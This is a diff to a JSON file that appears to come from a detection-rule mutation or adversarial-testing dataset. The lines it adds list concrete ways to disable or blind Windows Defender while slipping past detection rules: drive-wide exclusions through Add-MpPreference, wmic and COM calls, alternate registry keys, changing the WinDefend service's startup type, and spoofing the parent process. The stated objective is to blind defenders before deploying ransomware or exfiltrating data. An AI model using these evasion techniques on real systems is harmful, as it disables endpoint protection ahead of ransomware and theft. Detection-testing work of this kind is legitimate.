@@ -50,7 +50,24 @@
     }
   ],
   "mutation_hints": {
-    "evadable_fields": ["CommandLine", "Image", "TargetObject", "Details"],
-    "objective": "Blind the defender before deploying ransomware or exfiltrating data"
+    "evadable_fields": [
+      "CommandLine",
+      "Image",
+      "TargetObject",
+      "Details",
+      "ParentImage",
+      "User",
+      "IntegrityLevel"
+    ],
+    "objective": "Blind the defender before deploying ransomware or exfiltrating data",
+    "dwell_threshold_seconds": 90,
+    "detection_anchors": [
+      "Wildcard match: CommandLine contains Set-MpPreference AND Disable → use Add-MpPreference -ExclusionPath C:\\ (adds an exclusion for all of C: drive — same effect as disabling, but uses a different cmdlet name that avoids 'Disable' in the command)",
+      "Field match: Image=powershell.exe AND CommandLine contains WinDefend or MpPreference → use wmic.exe: 'wmic /namespace:\\\\root\\microsoft\\windows\\defender path MSFT_MpPreference call ApplyDefaultSettings' or invoke via COM object from a different process",
+      "Field match: TargetObject contains DisableAntiSpyware → use DisableRealtimeMonitoring (different registry key, same effect) or ExclusionPath under HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
+      "Field match: CommandLine contains 'sc.exe stop WinDefend' → use 'sc config WinDefend start= disabled' (changes startup type instead of stopping) or use the service control manager API via PowerShell: Stop-Service -Name WinDefend -Force",
+      "Field: ParentImage → the process spawning the disable command is a key alert; change from a suspicious parent (cmd.exe, shell) to a legitimate-looking one (taskhost.exe, svchost.exe)",
+      "Field: IntegrityLevel=High → this must be High to disable Defender; if this alert fires specifically on High integrity, the attack requires this level — focus on other fields instead"
+    ]
   }
 }
